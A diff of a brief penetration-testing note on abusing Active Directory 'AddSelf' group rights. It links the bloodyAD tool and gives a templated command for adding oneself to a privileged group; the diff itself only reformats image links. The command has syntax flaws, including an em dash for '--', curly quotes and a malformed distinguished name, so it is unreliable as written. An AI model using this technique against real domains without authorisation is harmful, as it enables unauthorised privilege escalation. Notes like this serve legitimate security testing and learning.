@@ -1,10 +1,10 @@
 Some users can add themselves to groups (check bloodhound)
-![[../../assets/AddSelf/image 406.png|image 406.png]]
+![image 406.png](../../assets/AddSelf/image%20406.png)
   
 Need bloodyAD
 https://github.com/CravateRouge/bloodyAD
   
-![[../../assets/AddSelf/image 1 303.png|image 1 303.png]]
+![image 1 303.png](../../assets/AddSelf/image%201%20303.png)
 - python3 bloodyAD —host <dc01.domain> -d <DOMAIN> -u <user> -p <pass> -k add groupMember “CN=<GROUP>,CN=USERS,DC=<DOMAIN>DC=,<SUBDOMAIN> <user_to_add>
     
     - user_to_add in this case would be the same user since you are “adding self”
